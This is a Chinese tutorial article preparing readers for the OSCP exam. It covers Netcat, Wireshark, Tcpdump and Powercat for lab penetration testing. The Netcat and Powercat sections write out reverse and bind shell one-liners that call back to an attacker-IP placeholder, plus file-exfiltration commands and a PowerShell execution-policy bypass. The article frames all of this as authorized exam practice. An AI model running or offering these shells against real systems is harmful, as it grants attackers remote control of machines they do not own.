---
title: OSCP百日备考05｜渗透工具封神榜！这4个核心工具，考场救命全靠它
url: https://mp.weixin.qq.com/s/njg5L0-IFifJkIC-7qXAgw
source: Doonsec's feed
date: 2026-05-08
fetch_date: 2026-05-09T05:05:09.310263
---

# OSCP百日备考05｜渗透工具封神榜！这4个核心工具，考场救命全靠它

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydUQE5ff6dZeQxtQDDQvT5N0FzcSFqK6Gicq7wicsic38JeN7SDhIF4egxXWCP7DrZly6nxDPGr0wYVC1N5xXY3ry0Sj9hFZbUNyGE/0?wx_fmt=jpeg)

# OSCP百日备考05｜渗透工具封神榜！这4个核心工具，考场救命全靠它

原创

陌离
陌离

泷羽Sec-陌离

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# OSCP百日备考05｜渗透工具封神榜！这4个核心工具，考场救命全靠它

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydU55H5EcIwo2L7e0dic4MhIIMPRcBbDdaVH6VM5t6GibmaIibk47H4WBhia9fjOggs8Kqwx7rJNNvI3EEk9rtTn1UIZlNZ679frTnA/640?wx_fmt=jpeg&from=appmsg)

上期我们把网络基础讲透了，很多同学后台问：“原理是懂了，但考试里到底该用什么工具？”“网上推荐了几十款工具，哪个是OSCP考场真正必用的？”“每次反弹shell都弹不回来，排查半天不知道是命令写错了还是防火墙拦了。”

太懂这种痛了。我见过太多人陷入一个致命误区：收藏夹里塞满了几百个渗透工具，结果到了考场里才发现，最核心、用得最多的，永远是那几个最基础的。甚至有人刷了几十台靶机，连最基础的nc反向shell都敲不对，拿到低权限后弹不回来，只能干着急；Windows靶机里找不到nc.exe，就完全不知道该怎么传文件、弹shell。

必须跟所有备考OSCP的宝子说一句：**OSCP考试拼的从来不是你会用多少工具，而是你能不能把最基础的工具玩透，在各种场景里灵活用出花来。**

今天这篇不讲冷门小众的工具，只讲OSCP考场里100%会用到的4个核心工具：**Netcat、Wireshark、Tcpdump、Powercat**。每一个都给你讲清楚“什么时候用、核心命令怎么写、新手容易踩什么坑”，所有命令均经过Kali和Windows靶机实测，零基础看完也能直接上手。

## 一、先划生死线：这几个工具考场里能不能用？

每次开篇都得把合规红线讲清楚：

| 工具 | 考场合规性 | 说明 |
| --- | --- | --- |
| Netcat | ✅ 完全允许 | 最基本的渗透工具 |
| Wireshark | ✅ 完全允许 | 流量分析排查问题用 |
| Tcpdump | ✅ 完全允许 | 无图形界面的抓包工具 |
| Powercat | ✅ 完全允许 | PowerShell版nc，Windows靶机必用 |
| **SQLMap** | ❌ 明确禁止 | 自动化注入工具 |
| **Nessus/OpenVAS** | ❌ 明确禁止 | 商业/开源漏扫一律禁用 |

**Metasploit在考试里限用一台靶机，且只能用payload模块，不能开它的自动化利用。** 所以这四个基础工具才是你考场里最靠谱的武器。

## 二、Netcat：渗透界的瑞士军刀，没有之一

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Nw0LxfseydXsVm7py0Mn2FeesXWXqm0h8XJLNIRRlGGRJBkq6ia8uv4kHHyOryictFNicA3vcX8KroBYlRRGRBIW2tvOk8NSsNdNHias0BP7rZI/640?wx_fmt=jpeg&from=appmsg)

Netcat（nc）的核心作用就是在两台主机之间建立网络连接、传输数据。反弹shell、文件传输、端口扫描、服务探测——本质上都是两台主机的数据传输，所以nc能搞定渗透测试里至少80%的基础网络操作。

Kali默认自带**OpenBSD版本的Netcat**。注意：这个版本**不支持`-e`参数**，下面每个用法都会给出适配方案。所有命令我都标注了“攻击机执行”还是“靶机执行”或“接收端/发送端”，新手再也不会搞反。

### 2.1 基础监听与连接

信息收集阶段探测服务、测试连通性用：

```
# 攻击机：监听本地4444端口（-l监听，-v详细输出，-p指定端口）
# OpenBSD版本nc可简写为 nc -lv 4444
nc -lvp 4444

# 攻击机：连接到目标主机的80端口，探测HTTP服务
nc 192.168.1.100 80
# 连上后输入 HEAD / HTTP/1.0 再按两次回车，能拿到Web服务器banner
```

### 2.2 端口扫描

快速探测目标主机开了哪些端口：

```
# TCP扫描（-z零IO模式只探端口不发数据，-w 1设置1秒超时避免卡住）
nc -zv -w 1 192.168.1.100 1-1000

# UDP扫描（加-u参数）
# 注意UDP无连接，扫描结果不如TCP准确
nc -zuv -w 1 192.168.1.100 53,161
```

### 2.3 文件传输

靶机和攻击机之间传工具、传exp、传flag，考场最常用的文件传输方式之一，不用搭HTTP服务：

```
# 【接收端-攻击机】先启动监听，把收到的数据写入output.txt
nc -lvp 4444 > output.txt

# 【发送端-靶机】把本地的file.txt发给攻击机
nc 192.168.1.攻击机IP 4444 < file.txt
```

⚠️ **新手必看：先开监听再执行发送，顺序搞反会失败！大文件建议用wget或curl替代。传输完成后nc不会自动退出，按Ctrl+C终止。**

### 2.4 反向Shell（重中之重！OSCP必考）

这是nc最核心的用法，考试里拿到漏洞后绝大多数场景都是用nc弹反向shell。

⚠️ 再次强调：**Kali默认的OpenBSD版nc不支持`-e`参数**，下面给出适配方案：

```
# 【第一步：攻击机】必须最先执行，开启监听等待靶机连过来
nc -lvp 4444

# 【第二步：Linux靶机-OpenBSD版nc适配方案】100%兼容Kali，直接用
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.攻击机IP 4444 > /tmp/f

# 【第二步：Linux靶机-GNU版nc支持-e】直接用-e执行bash
nc 192.168.1.攻击机IP 4444 -e /bin/bash

# 【第二步：Windows靶机-需先上传nc.exe到靶机】
nc 192.168.1.攻击机IP 4444 -e cmd.exe
```

### 2.5 绑定Shell

靶机开端口等攻击机连，适合攻击机在内网、靶机有公网IP的场景：

```
# 【目标靶机】监听4444端口，有人连进来就给bash
nc -lvp 4444 -e /bin/bash

# 【攻击机】直接连靶机就能拿到shell
nc 192.168.1.靶机IP 4444
```

### 2.6 常用选项速查表

| 选项 | 作用 | 注意事项 |
| --- | --- | --- |
| -l | 监听模式 | 仅攻击机/绑定shell靶机用，**反向shell靶机绝对不能加**——90%的弹壳失败都是这个原因 |
| -v | 详细输出 | 建议必加，能实时看连接状态 |
| -p | 指定端口 | GNU版本监听必加，OpenBSD版本可省略 |
| -e | 执行程序 | **仅GNU版nc支持** ，OpenBSD版用管道方案替代 |
| -n | 不做DNS解析 | 扫IP必加，大幅加速 |
| -u | UDP协议 | 默认TCP，扫UDP端口必须加 |
| -w | 超时时间 | 扫描/连接时必加 |
| -z | 零IO模式 | 仅端口扫描用 |

## 三、Wireshark：图形化流量分析神器

![](https://mmbiz.qpic.cn/mmbiz_png/Nw0LxfseydUs9nrrgWpxEdib6v6dGNHIWo3SZI70iaAWLaGUns5L1PrNiabiaSIwVGpB0aOR63Mkab7ORdHw86cibzF7iaQI0E9Kwnibvibqkmav0W8/640?wx_fmt=png&from=appmsg)

Wireshark是最强大的图形化网络协议分析工具。备考阶段学TCP/IP协议、考试里排查反弹shell失败原因、分析靶场流量包找漏洞利用关键数据，全离不开它。Kali默认自带，直接能用。

### 3.1 流量捕获

1. 打开Wireshark，选择你要监听的网络接口（eth0、tun0等）；
2. 可提前设置**捕获过滤器（BPF语法，和tcpdump通用）**，只抓需要的流量；
3. 点左上角鲨鱼鳍按钮开始捕获，操作完点停止。

### 3.2 TCP流追踪（新手必学）

这个功能能把整个TCP会话拼接起来，让你看到完整的请求和响应，不用在几万条数据里逐条翻。

操作：右键点击数据包 → **Follow** → **TCP Stream**，就能看到完整会话内容。

### 3.3 考试高频显示过滤器

捕获后过滤出你要的数据包，下面这些是考场最常用的：

```
# 过滤指定IP的双向流量
ip.addr == 192.168.1.100

# 过滤指定源/目标IP
ip.src == 192.168.1.100
ip.dst == 192.168.1.100

# 过滤指定端口
tcp.port == 80
udp.port == 53

# 过滤指定协议
http
dns

# 过滤HTTP POST请求（找账号密码必用）
http.request.method == "POST"

# 精准过滤TCP SYN包（排除SYN+ACK）
tcp.flags.syn == 1 && tcp.flags.ack == 0

# 排除ARP/ICMP/DNS等无关流量
!(arp or icmp or dns)
```

### 3.4 必知高级功能

* **导出对象**（文件 → 导出对象 → HTTP/SMB）：能直接提取流量里传输的文件，靶场流量包里的flag文件一键导出。仅对未加密明文流量有效。
* **专家信息**（分析 → 专家信息）：自动分析网络异常，排查反弹shell为什么连不上。
* **会话列表**：快速看哪两台主机间有大量数据传输，定位核心攻击流量。

### 3.5 避坑指南

1. **「捕获过滤器」和「显示过滤器」不是一回事**：捕获过滤器抓包前设置，用BPF语法；显示过滤器抓包后设置，用Wireshark专属语法。两者语法完全不一样，搞混了会失效。
2. 过滤语句严格区分大小写，`ip.addr`不能写成`ip_address`。
3. HTTPS加密流量需要先导入SSL密钥日志文件才能解密查看。

## 四、Tcpdump：命令行的网络分析利器

Tcpdump就是命令行版的Wireshark。考试里你拿到的Linux靶机多数没图形界面，想在靶机上抓包分析内网流量，全靠Tcpdump。几乎所有Linux系统默认自带，拿到shell就能直接用。

### 4.1 核心命令

```
# 基础抓包：指定网卡eth0
tcpdump -i eth0

# 【必加】-n不解析主机名和端口名，加速抓包；-s 0捕获完整数据包（默认只抓68字节）
tcpdump -i eth0 -n -s 0

# 保存到pcap文件，传到攻击机用Wireshark分析
tcpdump -i eth0 -n -s 0 -w capture.pcap

# 读取pcap文件
tcpdump -r capture.pcap

# 只抓100个包就停
tcpdump -i eth0 -n -c 100

# 以十六进制+ASCII显示数据包内容
tcpdump -i eth0 -n -X
```

### 4.2 高频过滤器（BPF语法，与Wireshark捕获过滤器通用）

```
# 过滤指定主机
tcpdump -i eth0 -n host 192.168.1.100

# 过滤指定端口
tcpdump -i eth0 -n port 80

# 过滤TCP协议
tcpdump -i eth0 -n tcp

# 组合过滤：TCP端口80且目标是指定IP
tcpdump -i eth0 -n 'tcp port 80 and host 192.168.1.100'

# 精准过滤SYN包（需要加单引号，避免shell解析&符号）
tcpdump -i eth0 -n 'tcp[13] == 2'
```

### 4.3 避坑

1. **普通用户无抓包权限**，必须加`sudo`或切到root。
2. **抓包前用`ip a`确认网卡名**，eth0、ens33、tun0各不相同。
3. 复杂过滤器**必须加单引号**，防止shell解析特殊符号。
4. 内网渗透时**优先保存为pcap文件**，传到攻击机用Wireshark分析效率高十倍。

## 五、Powercat：Windows靶机必备的反弹shell神器

Powercat是PowerShell版的Netcat，专治Windows靶机没有nc.exe的问题。几乎所有Windows都默认自带PowerShell，所以Powercat就是Windows环境里的最优解。

### 5.1 使用前提

Powercat不是Windows自带的，需要先导入。Kali里已预置，路径在`/usr/share/windows-resources/powercat/powercat.ps1`，把它传到靶机后执行：

```
# 【前置操作-靶机PowerShell】绕过执行策略（仅当前进程生效，不改系统配置）
Set-ExecutionPolicy Bypass -Scope Process -Force

# 【靶机PowerShell】导入powercat模块（注意.后面有空格）
. .\powercat.ps1
```

### 5.2 核心用法

```
# 监听本地端口
powercat -l -p 4444 -v

# 连接远程主机
powercat -c 192.168.1.攻击机IP -p 4444 -v

# 文件传输-接收端（攻击机）
powercat -l -p 4444 -of file.txt

# 文件传输-发送端（靶机，-raw传输二进制文件）
powercat -c 192.168.1.攻击机IP -p 4444 -i file.exe -raw

# 【核心】Windows反向shell
powercat -c 192.168.1.攻击机IP -p 4444 -e cmd.exe

# 【神器】生成独立payload脚本，不用每次都导入模块
powercat -c 192.168.1.攻击机IP -p 4444 -e cmd.exe -g > payload.ps1

# 断开自动重连，避免反弹shell意外中断
powercat -c 192.168.1.攻击机IP -p 4444 -e cmd.exe -d
```

### 5.3 常用选项速查表

| 选项 | 作用 | 注意事项 |
| --- | --- | --- |
| -l | 监听模式 | 和nc一致，反向shell靶机不加 |
| -p | 端口号 | 必加 |
| -c | 目标IP | 靶机反向shell必填攻击机IP |
| -e | 执行程序 | cmd.exe或powershell.exe |
| -i | 输入文件 | 发送文件用 |
| -of | 输出文件 | 接收文件用 |
| -raw | 二进制模式 | 传exe、图片必须加，否则文件损坏 |
| -g | 生成独立payload | 考场实用，不用每次导模块 |
| -d | 断线自动重连 | 反向shell必加 |

⚠️ **新手必看：**

1. Windows防火墙会拦截入站连接，监听前需关防火墙或添加入站规则。
2. Powercat需要PowerShell 3.0及以上，Windows 7/2008R2的2.0版本需升级后才能用。

## 六、备考工具避坑指南（过来人忠告）

**① 别贪多，先把这四个工具玩透。** 有人收藏了几百个工具，到了考场却连nc反向shell都敲不对。这四个工具覆盖90%的基础场景，先把它们练到肌肉记忆。

**② 搞清楚原理，别只会抄payload。** 很多人背反向shell命令却不知道为什么要先监听再连接，顺序搞反了弹不回来还满世界找问题。搞懂工具背后网络原理，遇到不同环境才能灵活调整。

**③ 严格遵守考试工具合规规则。** 这四个全合规。禁止的是商业漏扫和自动化利用框架。自己写的简单自动化脚本（如盲注Python脚本）是允许的。

**④ 动手实操，拒绝纸上谈兵。** 所有命令都要在自己的Kali攻击机和Windows/Linux靶机里跑一遍。知道成功什么样、失败什么样、报错了怎么排查。考场24小时很宝贵，只有平时练熟，考场里才能一秒敲对。

**⑤ Windows靶机优先用Powercat。** Windows没nc但有PowerShell，这是Windows环境的最优解，备考一定重点练。

### 写在最后

必须给大家敲一个最严肃的警钟：

**本文所有内容，仅用于OSCP认证备考、授权靶场的学习交流。所有技术只能在官方授权、你拥有合法测试权限的靶场、系统中使用。未经授权对任何网站、系统进行扫描、攻击、渗透测试，都是违法行为。请大家严格遵守《中华人民共和国网络安全法》等法律法规，坚守法律底线。**

按照OSCP百日备考计划，第一阶段的基础内容到这里就全部结束了。Linux、Windows、网络基础、核心工具这四大块，就是你渗透测试的地基。地基打牢了，后面的漏洞利用、提权、内网渗透都事半功倍。

如果觉得这篇有用，**点个“在看”并星标我**，别错过后续更新。

评论区可以留下你在这些工具上遇到的卡点，我会尽量回复。我们下期见。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/GOiczibvxk0XROVdRHd20297HPqUe6JxtuibRY8k4292NiaPqHIVPzf4CL3CiafGQAut0nZLWiau48GX68lVVovImbsQ/0?wx_fmt=png)

泷羽Sec-陌离

向上滑动看下一个

知...